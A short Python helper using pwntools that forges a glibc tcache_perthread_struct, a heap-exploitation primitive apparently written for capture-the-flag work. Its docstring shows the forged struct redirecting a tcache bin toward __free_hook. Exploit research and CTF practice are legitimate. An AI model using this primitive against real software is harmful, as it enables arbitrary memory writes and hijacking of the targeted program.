#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import p16, p64


def tcache_perthread_struct(fake_ptrs: dict):
    """
    fake_ptrs has (address: size) key-pairs

    Usage:
        SIZE = 0x40 # size of the 2nd allocation
        tcache_pointer = 0x7f638ae58530-0x00007f638ac65000+context.libc.address-0x40
        fake_tcache = tcache_perthread_struct({context.libc.symbols['__free_hook']-0x8: SIZE})
    """

    def csize2tidx(x):
        return (x - 1) // 16 - 1

    TCACHE_MAX_BINS = 0x40

    counts = [0 for _ in range(TCACHE_MAX_BINS)]
    entries = [0 for _ in range(TCACHE_MAX_BINS)]
    for addr, size in fake_ptrs.items():
        tidx = csize2tidx(size)
        counts[tidx] += 1
        entries[tidx] = addr

    return b"".join(map(p16, counts)) + b"".join(map(p64, entries))
